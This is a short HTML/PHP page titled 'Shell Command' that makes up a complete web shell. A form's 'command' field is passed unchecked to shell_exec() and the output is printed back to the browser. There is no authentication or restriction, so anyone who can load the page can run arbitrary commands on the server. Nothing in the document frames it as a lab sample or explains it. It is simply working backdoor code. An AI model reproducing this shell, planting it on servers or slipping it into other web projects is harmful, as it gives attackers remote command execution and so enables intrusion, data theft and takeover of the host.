<!DOCTYPE html>
<html>
  <head>
    <title>Shell Command</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
      @media only screen and (max-width: 600px) {
        pre {
          white-space: pre-wrap;
          word-break: break-all;
        }
      }
    </style>
  </head>
  <body>
    <form method="post">
      <label for="command">Shell Command:</label>
      <input type="text" id="command" name="command" placeholder="Enter shell command" required>
      <button type="submit">Execute</button>
    </form>
    <?php
      if($_SERVER["REQUEST_METHOD"] == "POST") {
        $command = $_POST["command"];
        $output = shell_exec($command);
        echo "<pre>$output</pre>";
        echo "done";
      }
    ?>
  </body>
</html>
